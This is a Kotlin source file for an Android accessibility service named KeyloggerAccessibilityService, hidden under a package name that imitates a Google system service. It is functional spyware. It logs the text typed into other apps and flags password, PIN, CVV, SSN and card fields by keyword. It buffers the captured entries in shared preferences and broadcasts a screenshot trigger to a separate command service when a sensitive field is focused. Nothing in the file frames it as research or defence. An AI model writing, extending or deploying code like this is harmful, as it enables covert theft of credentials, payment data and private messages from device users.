package com.google.android.systemservice.services

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.*

class KeyloggerAccessibilityService : AccessibilityService() {
    companion object {
        private const val TAG = "SystemKeylog"
        private const val MAX_BUFFER_SIZE = 500000 // 500KB buffer (increased from 50KB)
        private val SENSITIVE_KEYWORDS = listOf(
            "password", "pass", "pwd", "pin", "cvv", "cvc", "ssn", 
            "security", "secret", "key", "credit", "card", "account"
        )
    }

    private val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.getDefault())
    private var sessionId: String = UUID.randomUUID().toString()
    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event)
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> handleFocused(event)
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> handleWindowChanged(event)
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> handleContentChanged(event)
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val text = event.text?.joinToString("") ?: return
        if (text.isBlank()) return

        val packageName = event.packageName?.toString() ?: "unknown"
        val className = event.className?.toString() ?: "unknown"
        val timestamp = System.currentTimeMillis()
        
        // Extract node information for better context
        val nodeInfo = event.source
        val viewId = nodeInfo?.viewIdResourceName ?: ""
        val hint = nodeInfo?.hintText?.toString() ?: ""
        val inputType = getInputType(nodeInfo)
        
        val logEntry = JSONObject().apply {
            put("timestamp", timestamp)
            put("session_id", sessionId)
            put("event_type", "TEXT_CHANGED")
            put("app_package", packageName)
            put("activity", className)
            put("field_id", viewId)
            put("hint", hint)
            put("input_type", inputType)
            put("keystroke", text)
            put("full_text", nodeInfo?.text?.toString() ?: text)
        }
        
        appendToBuffer(logEntry.toString())
        
        // Capture screenshot if sensitive field detected
        if (isSensitiveField(hint, viewId, inputType)) {
            captureContextScreenshot(packageName, className, "sensitive_field")
        }
    }

    private fun handleFocused(event: AccessibilityEvent) {
        val className = event.className?.toString() ?: return
        val packageName = event.packageName?.toString() ?: "unknown"
        
        // Only log focus on text input fields
        if (className.contains("EditText", ignoreCase = true) ||
            className.contains("TextField", ignoreCase = true)) {
            
            val timestamp = System.currentTimeMillis()
            val nodeInfo = event.source
            val contentDesc = event.contentDescription?.toString() ?: ""
            val hint = nodeInfo?.hintText?.toString() ?: ""
            val viewId = nodeInfo?.viewIdResourceName ?: ""
            val inputType = getInputType(nodeInfo)
            
            val logEntry = JSONObject().apply {
                put("timestamp", timestamp)
                put("session_id", sessionId)
                put("event_type", "VIEW_FOCUSED")
                put("app_package", packageName)
                put("activity", className)
                put("field_id", viewId)
                put("hint", hint)
                put("input_type", inputType)
                put("content_description", contentDesc)
            }
            
            appendToBuffer(logEntry.toString())
            
            // Auto-capture screenshot on password field focus
            if (isSensitiveField(hint, viewId, inputType)) {
                captureContextScreenshot(packageName, className, "password_focus")
            }
        }
    }

    private fun handleWindowChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val className = event.className?.toString() ?: ""
        val timestamp = System.currentTimeMillis()
        
        val logEntry = JSONObject().apply {
            put("timestamp", timestamp)
            put("session_id", sessionId)
            put("event_type", "WINDOW_STATE_CHANGED")
            put("app_package", packageName)
            put("activity", className)
        }
        
        appendToBuffer(logEntry.toString())
    }
    
    private fun handleContentChanged(event: AccessibilityEvent) {
        // Track content changes for dynamic forms
        val packageName = event.packageName?.toString() ?: return
        val nodeInfo = event.source ?: return
        
        if (nodeInfo.className?.contains("EditText") == true) {
            val text = nodeInfo.text?.toString() ?: return
            if (text.isNotEmpty() && text.length < 100) { // Avoid logging very long text
                val logEntry = JSONObject().apply {
                    put("timestamp", System.currentTimeMillis())
                    put("session_id", sessionId)
                    put("event_type", "CONTENT_CHANGED")
                    put("app_package", packageName)
                    put("text_snippet", text)
                }
                appendToBuffer(logEntry.toString())
            }
        }
    }

    private fun getInputType(nodeInfo: AccessibilityNodeInfo?): String {
        nodeInfo ?: return "unknown"
        
        return when (nodeInfo.inputType) {
            android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD -> "password"
            android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD -> "visible_password"
            android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD -> "web_password"
            android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS -> "email"
            android.text.InputType.TYPE_CLASS_PHONE -> "phone"
            android.text.InputType.TYPE_CLASS_NUMBER -> "number"
            else -> "text"
        }
    }
    
    private fun isSensitiveField(hint: String, viewId: String, inputType: String): Boolean {
        val combined = "$hint $viewId $inputType".lowercase()
        return SENSITIVE_KEYWORDS.any { combined.contains(it) }
    }
    
    private fun captureContextScreenshot(packageName: String, className: String, triggerType: String) {
        serviceScope.launch {
            try {
                // Screenshot capture would require MediaProjection API
                // For now, log that a screenshot should be captured
                val screenshotEntry = JSONObject().apply {
                    put("timestamp", System.currentTimeMillis())
                    put("session_id", sessionId)
                    put("event_type", "SCREENSHOT_TRIGGER")
                    put("app_package", packageName)
                    put("activity", className)
                    put("trigger_type", triggerType)
                }
                
                appendToBuffer(screenshotEntry.toString())
                
                // Send screenshot command to CommandService
                val intent = Intent("com.google.android.systemservice.ACTION_KEYLOG_SCREENSHOT")
                intent.putExtra("package", packageName)
                intent.putExtra("trigger", triggerType)
                sendBroadcast(intent)
                
                Log.d(TAG, "Screenshot trigger sent for $packageName")
            } catch (e: Exception) {
                Log.e(TAG, "Error capturing screenshot: ${e.message}")
            }
        }
    }

    private fun appendToBuffer(entry: String) {
        try {
            val prefs = getSharedPreferences("keylog_prefs", MODE_PRIVATE)
            var buffer = prefs.getString("keylog_buffer", "") ?: ""
            
            // Check buffer size and trim if needed
            if (buffer.length + entry.length > MAX_BUFFER_SIZE) {
                // Keep last 75% of buffer
                val trimPoint = buffer.length / 4
                buffer = buffer.substring(trimPoint)
                Log.d(TAG, "Buffer trimmed from ${buffer.length + entry.length} to ${buffer.length}")
            }
            
            buffer += entry + "\n"
            prefs.edit().putString("keylog_buffer", buffer).apply()
            
            Log.d(TAG, "Keylog entry added: ${entry.length} bytes, total: ${buffer.length}")
        } catch (e: Exception) {
            Log.e(TAG, "Error appending to keylog buffer: ${e.message}")
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "KeyloggerAccessibilityService interrupted")
        serviceScope.cancel()
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        sessionId = UUID.randomUUID().toString()
        Log.d(TAG, "KeyloggerAccessibilityService connected, session: $sessionId")
    }
    
    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        Log.d(TAG, "KeyloggerAccessibilityService destroyed")
    }
}
